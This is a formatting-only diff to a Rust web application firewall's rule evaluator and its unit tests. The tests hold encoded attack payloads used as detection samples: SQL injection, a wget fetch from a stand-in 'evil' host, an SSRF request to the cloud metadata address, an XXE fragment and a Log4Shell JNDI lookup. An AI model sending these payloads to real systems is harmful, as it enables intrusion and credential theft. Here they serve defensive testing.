@@ -399,7 +399,10 @@ fn is_static_asset(path: &str) -> bool {
     if !last.contains('.') {
         return false;
     }
-    let ext = format!(".{}", last.rsplit('.').next().unwrap_or("").to_ascii_lowercase());
+    let ext = format!(
+        ".{}",
+        last.rsplit('.').next().unwrap_or("").to_ascii_lowercase()
+    );
     STATIC_EXT.contains(&ext.as_str())
 }
 
@@ -543,7 +546,11 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
     if cfg.managed.log4shell && contains_any(&haystack, LOG4SHELL) {
         return Some(verdict("Log4Shell", "log4shell"));
     }
-    if cfg.managed.crlf && (path.contains('\r') || path.contains('\n') || query.contains('\r') || query.contains('\n'))
+    if cfg.managed.crlf
+        && (path.contains('\r')
+            || path.contains('\n')
+            || query.contains('\r')
+            || query.contains('\n'))
     {
         return Some(verdict("CRLF / 头注入", "crlf"));
     }
@@ -623,9 +630,12 @@ mod tests {
         let c = cfg();
         let h = HeaderMap::new();
         assert_eq!(
-            evaluate(&c, &req(&h, "/search", "q=1%27%20or%20%271%27=%271", "curl"))
-                .unwrap()
-                .category,
+            evaluate(
+                &c,
+                &req(&h, "/search", "q=1%27%20or%20%271%27=%271", "curl")
+            )
+            .unwrap()
+            .category,
             "sqli"
         );
         assert_eq!(
@@ -779,7 +789,11 @@ mod tests {
             ("/run", "cmd=wget%20http://evil/x", "rce"),
             ("/proxy", "url=http%3A%2F%2F169.254.169.254%2Fmeta", "ssrf"),
             ("/xml", "data=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY", "xxe"),
-            ("/login", "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D", "log4shell"),
+            (
+                "/login",
+                "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D",
+                "log4shell",
+            ),
         ];
         for (path, query, category) in cases {
             assert_eq!(
